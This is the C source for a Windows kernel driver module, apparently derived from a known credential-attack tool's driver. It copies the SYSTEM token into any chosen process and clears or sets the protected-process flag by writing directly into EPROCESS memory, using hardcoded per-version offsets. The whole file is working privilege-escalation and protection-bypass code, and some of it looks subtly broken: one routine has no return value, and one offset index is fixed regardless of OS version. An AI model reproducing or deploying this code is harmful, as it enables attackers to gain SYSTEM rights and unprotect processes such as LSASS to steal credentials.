#include <ntifs.h>

#include "mod_process.h"



const ULONG EPROCESS_OffSetTable[8][4] =
{					/*  EprocessNext, EprocessFlags2, TokenPrivs, SignatureProtect */
#ifdef _M_IX86
/* UNK	*/	{0},
/* XP	*/{ 0x0088 },
/* 2K3	*/{ 0x0098 },
/* VISTA*/{ 0x00a0, 0x0224, 0x0040 },
/* 7	*/{ 0x00b8, 0x026c, 0x0040 },
/* 8	*/{ 0x00b8, 0x00c0, 0x0040, 0x02d4 },
/* BLUE	*/{ 0x00b8, 0x00c0, 0x0040, 0x02cc },
/* 10	*/{ 0x00b8, 0x00c0, 0x0040, 0x02d4 },
#else
/* UNK	*/{ 0 },
/* XP	*/{ 0 },
/* 2K3	*/{ 0x00e0 },
/* VISTA*/{ 0x00e8, 0x036c, 0x0040 },
/* 7	*/{ 0x0188, 0x043c, 0x0040 },
/* 8	*/{ 0x02e8, 0x02f8, 0x0040, 0x0648 },
/* BLUE	*/{ 0x02e8, 0x02f8, 0x0040, 0x0678 },
/* 10	*/{ 0x02f0, 0x0300, 0x0040, 0x0698 },
#endif
};



NTSTATUS sysProcessToken(SIZE_T szBufferIn, PVOID bufferIn, PDRX_BUFFER outBuffer)
{
	NTSTATUS status = STATUS_SUCCESS;


	HANDLE hFromProcess;
	HANDLE hFromProcessToken;
	// Assuming we whant a system process so we use PsInitialSystemProcess witch run under nt-authority\system
	PEPROCESS pFromProcess = PsInitialSystemProcess;
	PEPROCESS pToProcess = NULL;

	// Getting the PEPROCESS struct given the target pid
	status = PsLookupProcessByProcessId((HANDLE)bufferIn, &pToProcess);

	if (NT_SUCCESS(status))
	{
		// Getting the HANDLE of the initial System process
		status = ObOpenObjectByPointer(pFromProcess, OBJ_KERNEL_HANDLE, NULL, 0, *PsProcessType, KernelMode, &hFromProcess);
		if (NT_SUCCESS(status))
		{
			// Get the token handle of the initialsystemprocess
			status = ZwOpenProcessTokenEx(hFromProcess, 0, OBJ_KERNEL_HANDLE, &hFromProcessToken);
			if (NT_SUCCESS(status))
			{
				// Outputing to userland-apps
				status = zprintf(outBuffer, L"Token from %u/%-14S\n", PsGetProcessId(pFromProcess), PsGetProcessImageFileName(pFromProcess));
				if (NT_SUCCESS(status))
				{					
					if (pToProcess)
						status = sysProcessTokenDuplicator(szBufferIn, bufferIn, outBuffer, hFromProcessToken, pToProcess);
				}
				ZwClose(hFromProcessToken);
			}
			ZwClose(hFromProcess);
		}
	}



}

// Main function wich duplicate source token to target process
NTSTATUS sysProcessTokenDuplicator(SIZE_T szBufferIn, PVOID bufferIn, PDRX_BUFFER outBuffer, HANDLE hSrcToken, PEPROCESS pToProcess)
{
	PROCESS_ACCESS_TOKEN ProcessTokenInformation = { NULL, NULL };
	HANDLE hToProcess;
	PULONG pFlags2 = NULL;
	NTSTATUS status;




	HANDLE processId = PsGetProcessId(pToProcess);
	PCHAR processName = PsGetProcessImageFileName(pToProcess);


	status = ObOpenObjectByPointer(pToProcess, OBJ_KERNEL_HANDLE, NULL, 0, *PsProcessType, KernelMode, &hToProcess);
	if (NT_SUCCESS(status))
	{
		status = ZwDuplicateToken(hSrcToken, 0, NULL, FALSE, TokenPrimary, &ProcessTokenInformation.Token);
		if (NT_SUCCESS(status))
		{

				pFlags2 = (PULONG)(((ULONG_PTR)pToProcess) + EPROCESS_OffSetTable[4][1]);
				if (*pFlags2 & TOKEN_FROZEN_MASK)
					*pFlags2 &= ~TOKEN_FROZEN_MASK;
				else
					pFlags2 = NULL;
			

			status = ZwSetInformationProcess(hToProcess, ProcessAccessToken, &ProcessTokenInformation, sizeof(PROCESS_ACCESS_TOKEN));
			if (NT_SUCCESS(status))
				status = zprintf(outBuffer, L" * to %u/%-14S\n", processId, processName);
			else
				status = zprintf(outBuffer, L" ! ZwSetInformationProcess 0x%08x for %u/%-14S\n", status, processId, processName);

			if (pFlags2)
				*pFlags2 |= TOKEN_FROZEN_MASK;

			ZwClose(ProcessTokenInformation.Token);
		}
		ZwClose(hToProcess);
	}
	return status;
}

NTSTATUS sysUnprotectProcess(SIZE_T szBufferIn, PVOID bufferIn, PDRX_BUFFER outBuffer)
{
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS pProcess = NULL;

	PDRX_PROCESS_SIGNATURE_PROTECTION pSignProtect = NULL;
	PULONG pFlag2 = NULL;
	PDRXDRV_PROCESS_PROTECT_INFORMATION pInfos = (PDRXDRV_PROCESS_PROTECT_INFORMATION)bufferIn;
	
	// Protected process not existe befor vista
	if (INDEX_OS < INDEX_VISTA)
	{
		zprintf(outBuffer, L"Not suported");
		return STATUS_NOT_SUPPORTED;
	}


	if (pInfos && (szBufferIn == sizeof(DRXDRV_PROCESS_PROTECT_INFORMATION)))
	{
		status = PsLookupProcessByProcessId((HANDLE)pInfos->processId, &pProcess);
		if (NT_SUCCESS(status))
		{
			zprintf(outBuffer,L"Set flag proc");
			pFlag2 = (PULONG)(((ULONG_PTR)pProcess) + EPROCESS_OffSetTable[4][1]);
			if (pInfos->SignatureProtection.SignatureLevel)
			{
				*pFlag2 |= PROTECTED_PROCESS_MASK;
			}
			else
			{
				*pFlag2 &= ~PROTECTED_PROCESS_MASK;
			}
			ObDereferenceObject(pProcess);
		}
		else
		{
			zprintf(outBuffer, L"PsLookupProcess failed.");
		}
	}
	else
	{
		zprintf(outBuffer, L"Invalid Param.");
		status = STATUS_INVALID_PARAMETER;
	}

	return status;
}